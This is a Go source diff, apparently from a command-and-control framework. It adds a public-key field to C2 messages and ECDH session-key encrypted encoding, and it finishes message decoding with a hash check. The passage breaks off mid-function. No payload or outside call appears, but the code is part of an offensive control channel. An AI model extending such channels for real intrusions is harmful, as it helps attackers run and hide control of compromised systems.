@@ -29,6 +29,7 @@ type C2Message struct {
 	Data      string                 `json:"data,omitempty"`
 	Ts        float64                `json:"ts"`
 	SessionID string                 `json:"sid,omitempty"`
+	PubKey    string                 `json:"pubkey,omitempty"`
 }
 
 // NewC2Message creates a new C2Message with current timestamp.
@@ -52,6 +53,9 @@ func (m *C2Message) ToCommandMap() map[string]interface{} {
 	if m.SessionID != "" {
 		d["sid"] = m.SessionID
 	}
+	if m.PubKey != "" {
+		d["pubkey"] = m.PubKey
+	}
 	return d
 }
 
@@ -67,6 +71,9 @@ func (m *C2Message) ToResultMap() map[string]interface{} {
 	if m.SessionID != "" {
 		d["sid"] = m.SessionID
 	}
+	if m.PubKey != "" {
+		d["pubkey"] = m.PubKey
+	}
 	return d
 }
 
@@ -77,6 +84,7 @@ func FromCommandMap(d map[string]interface{}) *C2Message {
 		Seq:       getInt(d, "seq"),
 		Ts:        getFloat(d, "ts"),
 		SessionID: getString(d, "sid"),
+		PubKey:    getString(d, "pubkey"),
 	}
 	if args, ok := d["args"]; ok && args != nil {
 		if argsMap, ok := args.(map[string]interface{}); ok {
@@ -98,6 +106,7 @@ func FromResultMap(d map[string]interface{}) *C2Message {
 		Data:      getString(d, "data"),
 		Ts:        getFloat(d, "ts"),
 		SessionID: getString(d, "sid"),
+		PubKey:    getString(d, "pubkey"),
 	}
 }
 
@@ -135,6 +144,72 @@ func DecodeMessage(b64Payload, encryptionKey string) (map[string]interface{}, er
 	}
 
 	decrypted, err := crypto.Decrypt(raw, encryptionKey)
+	if err != nil {
+		return nil, fmt.Errorf("decrypt: %w", err)
+	}
+
+	if len(decrypted) < 2 {
+		return nil, fmt.Errorf("decrypted data too short")
+	}
+	hashLen := binary.BigEndian.Uint16(decrypted[:2])
+	if int(hashLen)+2 > len(decrypted) {
+		return nil, fmt.Errorf("invalid hash length")
+	}
+	storedHash := string(decrypted[2 : 2+hashLen])
+	compressed := decrypted[2+hashLen:]
+
+	plaintext, err := encoding.Decompress(compressed)
+	if err != nil {
+		return nil, fmt.Errorf("decompress: %w", err)
+	}
+
+	actualHash := crypto.ComputeBlake2b(plaintext)
+	if storedHash != actualHash {
+		return nil, fmt.Errorf("C2 message integrity check failed")
+	}
+
+	var result map[string]interface{}
+	if err := json.Unmarshal(plaintext, &result); err != nil {
+		return nil, fmt.Errorf("json unmarshal: %w", err)
+	}
+	return result, nil
+}
+
+// EncodeMessageRaw encodes a message dict using a pre-derived raw AES key (no PBKDF2).
+// Used for session-key encrypted messages after ECDH key exchange.
+func EncodeMessageRaw(messageDict map[string]interface{}, rawKey []byte) (string, error) {
+	plaintext, err := json.Marshal(messageDict)
+	if err != nil {
+		return "", fmt.Errorf("json marshal: %w", err)
+	}
+
+	checksum := crypto.ComputeBlake2b(plaintext)
+	compressed := encoding.Compress(plaintext)
+
+	hashBytes := []byte(checksum)
+	hashLen := make([]byte, 2)
+	binary.BigEndian.PutUint16(hashLen, uint16(len(hashBytes)))
+
+	data := append(hashLen, hashBytes...)
+	data = append(data, compressed...)
+
+	encrypted, err := crypto.EncryptFast(data, rawKey)
+	if err != nil {
+		return "", fmt.Errorf("encrypt: %w", err)
+	}
+
+	return base64.StdEncoding.EncodeToString(encrypted), nil
+}
+
+// DecodeMessageRaw decodes an encrypted Base64 string using a pre-derived raw AES key.
+// Used for session-key encrypted messages after ECDH key exchange.
+func DecodeMessageRaw(b64Payload string, rawKey []byte) (map[string]interface{}, error) {
+	raw, err := base64.StdEncoding.DecodeString(b64Payload)
+	if err != nil {
+		return nil, fmt.Errorf("base64 decode: %w", err)
+	}
+
+	decrypted, err := crypto.DecryptFast(raw, rawKey)
 	if err != nil {
 		return nil, fmt.Errorf("decrypt: %w", err)
 	}
